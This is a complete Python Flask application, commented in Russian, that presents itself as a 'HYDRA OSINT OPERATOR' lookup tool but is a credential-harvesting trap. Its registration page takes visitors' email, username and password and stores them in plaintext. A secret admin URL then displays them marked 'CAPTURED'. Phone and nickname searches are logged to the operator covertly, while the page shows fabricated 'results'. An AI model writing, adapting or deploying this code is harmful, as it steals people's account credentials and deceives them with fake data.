from flask import Flask, request, jsonify, render_template_string, session, redirect, send_file
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_ELITE_SYSTEM_2026'

# --- ХРАНИЛИЩЕ ДАННЫХ (В ПАМЯТИ) ---
db = {
    "registered_users": [], # Те, кто прошел регистрацию на входе
    "queries": []           # Что люди искали в терминале
}

# --- ЦЕНТРАЛЬНЫЙ ДИЗАЙН (ФИОЛЕТОВЫЙ НЕОН) ---
COMMON_STYLE = """
<style>
    body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .neon-box { border: 2px solid #bc13fe; box-shadow: 0 0 20px #bc13fe; background: rgba(10,0,20,0.95); padding: 30px; border-radius: 10px; width: 400px; text-align: center; }
    h1 { color: #0ff; text-shadow: 0 0 10px #0ff; text-transform: uppercase; margin-bottom: 20px; }
    input { background: transparent; border: 1px solid #bc13fe; color: #0f0; width: 80%; padding: 10px; margin-bottom: 15px; outline: none; }
    .btn { background: #bc13fe; color: #fff; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; text-transform: uppercase; transition: 0.3s; }
    .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 15px #0ff; }
    a { color: #0ff; text-decoration: none; font-size: 12px; }
</style>
"""

# --- ЭКРАН РЕГИСТРАЦИИ (ТО ЧТО ВИДИТ ЮЗЕР ПРИ ВХОДЕ) ---
REG_PAGE = f"""
<!DOCTYPE html>
<html>
<head><title>HYDRA | ACCESS REQUIRED</title>{COMMON_STYLE}</head>
<body>
    <div class="neon-box">
        <h1>// REGISTRATION //</h1>
        <form action="/api/register" method="POST">
            <input name="email" type="email" placeholder="GMAIL / EMAIL" required><br>
            <input name="user" type="text" placeholder="USERNAME" required><br>
            <input name="pass" type="password" placeholder="PASSWORD" required><br>
            <button class="btn">INITIALIZE ACCESS</button>
        </form>
        <p style="font-size: 10px; margin-top: 15px;">BY CLICKING YOU AGREE TO HYDRA PROTOCOLS</p>
    </div>
</body>
</html>
"""

# --- ГЛАВНЫЙ ТЕРМИНАЛ (ОТКРЫВАЕТСЯ ПОСЛЕ РЕГИСТРАЦИИ) ---
TERMINAL_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA TERMINAL</title>
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 20px; }
        .main-frame { border: 2px solid #bc13fe; box-shadow: 0 0 20px #bc13fe; padding: 20px; background: rgba(0,0,0,0.9); }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .box { border: 1px solid #0f0; padding: 15px; background: #050505; }
        input { background: transparent; border: 1px solid #bc13fe; color: #0f0; width: 70%; padding: 5px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 5px 15px; cursor: pointer; }
        #term { background: #000; border: 1px solid #0f0; height: 200px; overflow-y: auto; padding: 10px; margin-top: 20px; color: #0f0; font-size: 14px; }
    </style>
</head>
<body>
    <div class="main-frame">
        <h1 style="color:#0ff; text-align:center;">// HYDRA OSINT OPERATOR //</h1>
        <div class="grid">
            <div class="box"><span>// PHONE</span><br><input id="p"><button class="btn" onclick="scan('PHONE', 'p')">SEARCH</button></div>
            <div class="box"><span>// NICKNAME</span><br><input id="n"><button class="btn" onclick="scan('NICK', 'n')">TRACE</button></div>
        </div>
        <div id="term">> SESSION STARTED. READY...</div>
    </div>
    <script>
        function scan(type, id) {
            const val = document.getElementById(id).value;
            const t = document.getElementById('term');
            if(!val) return;
            t.innerHTML += `<br>[*] Запрос к базе данных для: ${val}...`;
            
            // Отправляем запрос в админку (скрыто) и получаем "данные" для юзера
            fetch('/api/track_query', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: type, val: val})
            });

            setTimeout(() => {
                t.innerHTML += `<br><span style="color:#0ff">[SUCCESS] Данные найдены:</span>`;
                t.innerHTML += `<br>--- РЕЗУЛЬТАТ ОБРАБОТКИ ---`;
                t.innerHTML += `<br>> Страна: Uzbekistan`;
                t.innerHTML += `<br>> Оператор/Провайдер: Установлен`;
                t.innerHTML += `<br>> Риск: Средний`;
                t.innerHTML += `<br>--------------------------`;
                t.scrollTop = t.scrollHeight;
            }, 1000);
        }
    </script>
</body>
</html>
"""

# --- ИННОВАЦИОННАЯ АДМИН-ПАНЕЛЬ ---
ADMIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>HYDRA | CONTROL CENTER</title>
<style>
    body { background: #050505; color: #0f0; font-family: monospace; padding: 20px; }
    .dashboard { border: 1px solid #bc13fe; padding: 20px; box-shadow: 0 0 15px #bc13fe; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { border: 1px solid #333; padding: 10px; text-align: left; }
    th { color: #bc13fe; text-transform: uppercase; }
    .status-online { color: #0f0; font-weight: bold; }
</style>
</head>
<body>
    <div class="dashboard">
        <h1>[ HYDRA CONTROL CENTER v4.0 ]</h1>
        <h3>// REGISTERED ENTITIES (USERS)</h3>
        <table>
            <tr><th>Email</th><th>Username</th><th>Password</th><th>Status</th></tr>
            {% for u in users %}
            <tr><td>{{ u.email }}</td><td>{{ u.user }}</td><td>{{ u.pass }}</td><td class="status-online">CAPTURED</td></tr>
            {% endfor %}
        </table>

        <h3 style="margin-top:40px;">// LIVE QUERY LOGS</h3>
        <table>
            <tr><th>Type</th><th>Search Value</th><th>Timestamp</th></tr>
            {% for q in queries %}
            <tr><td>{{ q.type }}</td><td>{{ q.val }}</td><td>{{ q.time }}</td></tr>
            {% endfor %}
        </table>
        <br><a href="/" style="color:#0ff">BACK TO TERMINAL</a>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    if 'authorized' in session: return render_template_string(TERMINAL_PAGE)
    return render_template_string(REG_PAGE)

@app.route('/api/register', methods=['POST'])
def register():
    email, user, pwd = request.form.get('email'), request.form.get('user'), request.form.get('pass')
    db['registered_users'].append({"email": email, "user": user, "pass": pwd})
    session['authorized'] = True
    return redirect('/')

@app.route('/api/track_query', methods=['POST'])
def track():
    data = request.json
    db['queries'].append({"type": data['type'], "val": data['val'], "time": datetime.now().strftime("%H:%M:%S")})
    return jsonify({"status": "logged"})

@app.route('/abupaay_admin') # Твоя секретная ссылка
def admin():
    return render_template_string(ADMIN_PAGE, users=db['registered_users'], queries=db['queries'])

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
